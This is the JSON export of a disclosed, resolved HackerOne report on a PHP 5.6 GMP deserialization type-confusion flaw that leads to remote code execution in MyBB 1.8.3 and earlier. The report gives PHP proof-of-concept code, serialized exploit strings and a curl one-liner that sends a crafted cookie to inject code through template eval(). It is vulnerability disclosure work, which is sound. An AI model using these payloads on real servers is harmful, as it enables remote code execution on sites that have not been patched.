{
  "id": 198734,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTg3MzQ=",
  "url": "https://hackerone.com/reports/198734",
  "title": "GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-01-16T13:37:46.851Z",
  "submitted_at": "2017-01-16T13:37:46.851Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ryat",
    "url": "/ryat",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141301Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ca09e834faa0646e6051e925d631471eff85c72aa1fea0a2fd0eb6a36bb4d12c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141301Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bacb22d956e831aef49e43f9eb60bcf996563c1a45e66187a057e97bd51b59b1",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUVBRNLRJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141301Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3nvre18sAd1wct05fqsgN7bQuQDSO9jbe432Lz6NEiAIhAPoaLF1AuRHIcBqdTHYy5hp6%2BvzlDX81Yx2ItLaNH5iMKrEFCBMQAxoMMDEzNjE5Mjc0ODQ5IgxawqXHjAefXDd0sHUqjgVoaYiaUVH5r6TFZ9iq9qUnb9L%2BPMrDYzIHjUHRgSChDUE4WH2dKmYRW2q2q4xlTuK0moDBbcERxjxpQaePRoztwTSWasB3S5ou6013SwwZPI%2BerbtbFTOOPFrjew9xkcsPPgFLEYpy4pUxSQ0K00v3tYCIsFmhZodUZMycXEJisE5Ez3DOlbuw4UN8xXzSuXYdjuY3B2amlBfItWeAlLc113UqV7nZmU0XN4RGtusu2drVySbBZ9OXiTyPX%2FGBD%2Fb%2FDsD7mTw97rTkXMxvPzAU7z0jCqZUubHuf5KA5fqnpQTPWKz5bjFQGPqOxzRQwjVik6coRNXvc8fTo14I35D9ic8jKMFVZjlg5PNcw6NfCG9O%2FOPQUuWot7xHfDP9Uq3pbjWX8fmtmpWxME9ccW5H0X1scPdeGarjmSAp8UmrE8Jf7vOKgGW4iGireL48Wpmhvv9v9lovUiNWRPtbDbuGtUgdxrtJnPsp%2FF%2B7TXVTVHaccptBlK4S3A9lzAA6acesy32RFhQcdOaK0AfzODWw1yqdH%2B7eZiy7J4YbwlgaktI6kOXlOSdGPVaLI02UQT6Ua03IA4PC0zFFrWO9VqYFKSjm1FRDsX%2BsT0oGPVV0KWXytEQkDTw0zI3mihCGH0CYlkdcI2TJyIMDJwV0M2e43uh4PUqRKNO7vzKdAYogQzNw36idX%2FsQHlRFklh99yyBNnTdY8gLndE3dt5wlh7dn%2FnVChRLORTzSLhsMCAV1VTeCdWTSPWn0BmEKOyBsDo0mxa9m0POzueMIDUxNcF9b7wURDV2urWl9N32snkQJ3l4hR40m6WgBHmcEqF24ZmlX0DHdLl922xTKbcbGphfwecXlGzkiE01cxNJHXUwiJe%2FxgY6sAGt5UNeZn4rnknZG1wh45ZoQGtvLnlNLBWvKLU1fvwfEVc1Y3eZ4ONW36DJ14fiz8dc77hv%2FGbKAeRjDpc2xqYI%2FEjt4i8NZuiYzFYYvbk5RRu04cYqJtexxtDR422U%2BfT9cyLUg6bONp6Z2gZPVDC%2BpuN4RFWd%2F0ofdGB%2BqI7w%2FkneiZqccP29CAjkj%2BbU5bjDj5f4KGN2tXxAkDXYRtaFAAG2%2BEhds3d0%2BG1Q9pU3mA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9079d59c168c2a87f9ffe38d8bf2fa49849da65c17c166a6fdae94a1bfb83b2b"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-13T11:11:07.711Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-13T11:11:07.653Z",
  "team_member_agreed_on_going_public_at": "2019-10-13T09:19:43.606Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]\n\nTaoguang Chen <[@chtg57](https://twitter.com/chtg57)> - Write Date: 2015.4.28\n\n> A type-confusion vulnerability was discovered in GMP deserialization with crafted object's __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.\n\nAffected Versions\n------------\nAffected is PHP 5.6 < 5.6.30\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\ngmp.c\n```\nstatic int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */\n{\n\t...\n\tALLOC_INIT_ZVAL(zv_ptr);\n\tif (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)\n\t\t|| Z_TYPE_P(zv_ptr) != IS_ARRAY\n\t) {\n\t\tzend_throw_exception(NULL, \"Could not unserialize properties\", 0 TSRMLS_CC);\n\t\tgoto exit;\n\t}\n\n\tif (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {\n\t\tzend_hash_copy(\n\t\t\tzend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),\n\t\t\t(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)\n\t\t);\n\t}\n```\n\nzend_object_handlers.c\n```\nZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */\n{\n\tzend_object *zobj;\n\tzobj = Z_OBJ_P(object);\n\tif (!zobj->properties) {\n\t\trebuild_object_properties(zobj);\n\t}\n\treturn zobj->properties;\n}\n```\n\nIt has been demonstrated many times before that __wakeup() or other magic methods leads to ZVAL was changed from the memory in during deserializtion. So an attacker can change **object into an integer-type or bool-type ZVAL, then the attacker will be able to access any objects that stored in objects store via Z_OBJ_P. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.\n\nThe following codes will prove this vulnerability:\n```\n<?php\n\nclass obj\n{\n\tvar $ryat;\n\t\n\tfunction __wakeup()\n\t{\n\t\t$this->ryat = 1;\n\t}\n}\n\n$obj = new stdClass;\n$obj->aa = 1;\n$obj->bb = 2;\n\n$inner = 's:1:\"1\";a:3:{s:2:\"aa\";s:2:\"hi\";s:2:\"bb\";s:2:\"hi\";i:0;O:3:\"obj\":1:{s:4:\"ryat\";R:2;}}';\n$exploit = 'a:1:{i:0;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}';\n$x = unserialize($exploit);\nvar_dump($obj);\n\n?>\n```\n\nExpected result:\n```\nobject(stdClass)#1 (2) {\n  [\"aa\"]=>\n  int(1)\n  [\"bb\"]=>\n  int(2)\n}\n```\n\nActual result:\n```\nobject(stdClass)#1 (3) {\n  [\"aa\"]=>\n  string(2) \"hi\"\n  [\"bb\"]=>\n  string(2) \"hi\"\n  [0]=>\n  object(obj)#3 (1) {\n    [\"ryat\"]=>\n    &int(1)\n  }\n}\n```\n\ni) How to exploited this bug in real world?\nOn php 5.6 <= 5.6.11, DateInterval's __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type ZVAL via GMP's gmp_cast_object():\n\n```\nstatic int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */\n{\n    mpz_ptr gmpnum;\n    switch (type) {\n    ...\n    case IS_LONG:\n        gmpnum = GET_GMP_FROM_ZVAL(readobj);\n        INIT_PZVAL(writeobj);\n        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));\n        return SUCCESS;\n```\n\nThe following codes will prove this exploite way:\n```\n<?php\n\nvar_dump(unserialize('a:2:{i:0;C:3:\"GMP\":17:{s:4:\"1234\";a:0:{}}i:1;O:12:\"DateInterval\":1:{s:1:\"y\";R:2;}}'));\n\n?>\n```\nOf course, a crafted __wakeup() can also be exploited, ex:\n\n```\n<?php\n\nfunction __wakeup()\n{\n    $this->ryat = (int) $this->ryat;\n}\n\n?>\n```\n\nii) Can be exploited this bug in real app?\n\nOn MyBB <= 1.8.3:\n\nindex.php\n```\n\tif(isset($mybb->cookies['mybb']['forumread']))\n\t{\n\t\t$forumsread = my_unserialize($mybb->cookies['mybb']['forumread']);\n\t}\n```\n\nMyBB <= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update $mybb or other object's any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)\n\nP.S. I had reported this vulnerability and it had been fixed in mybb >= 1.8.4.\n\nProof of Concept Exploit\n------------\nMyBB <= 1.8.3 RCE vulnerability\n\nindex.php\n```\neval('$index = \"'.$templates->get('index').'\";');\n```\n\nMyBB always use eval() function in during template parsing.\n\ninc/class_templates.php\n```\nclass templates\n{\n\t...\n\tpublic $cache = array();\n\t...\n\tfunction get($title, $eslashes=1, $htmlcomments=1)\n\t{\n\t\tglobal $db, $theme, $mybb;\n\t\t...\n\t\t$template = $this->cache[$title];\n\t\t...\n\t\treturn $template;\n\t}\n```\n\nIf we can control the `$cache`, we will be albe to inject php code via eval() function.\n\ninc/init.php\n```\n$error_handler = new errorHandler();\n...\n$maintimer = new timer();\n...\n$mybb = new MyBB;\n...\nswitch($config['database']['type'])\n{\n\tcase \"sqlite\":\n\t\t$db = new DB_SQLite;\n\t\tbreak;\n\tcase \"pgsql\":\n\t\t$db = new DB_PgSQL;\n\t\tbreak;\n\tcase \"mysqli\":\n\t\t$db = new DB_MySQLi;\n\t\tbreak;\n\tdefault:\n\t\t$db = new DB_MySQL;\n}\n...\n$templates = new templates;\n```\n\nThe `$templates` object was instantiated in init.php, and four objects was instantiated in this before. This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization. This also means we can inject php code via eval() function.\n\nWhen MyBB <= 1.8.3 and PHP5.6 <= 5.6.11, remote code execution by just using curl on the command line:\n```\ncurl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:\"GMP\":106:{s:1:\"5\"%3ba:2:{s:5:\"cache\"%3ba:1:{s:5:\"index\"%3bs:14:\"{${phpinfo()}}\"%3b}i:0%3bO:12:\"DateInterval\":1:{s:1:\"y\"%3bR:2%3b}}}}' http://127.0.0.1/mybb/\n```",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:19:43.677Z",
  "allow_singular_disclosure_after": -184913597.58962354,
  "singular_disclosure_allowed": true,
  "vote_count": 68,
  "voters": [
    "jbreed",
    "sameerphad72",
    "xingguang",
    "doomf",
    "geeknik",
    "broodkiller_",
    "jackb898",
    "smodnix",
    "xaleraf4ra",
    "iohex",
    "and 58 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
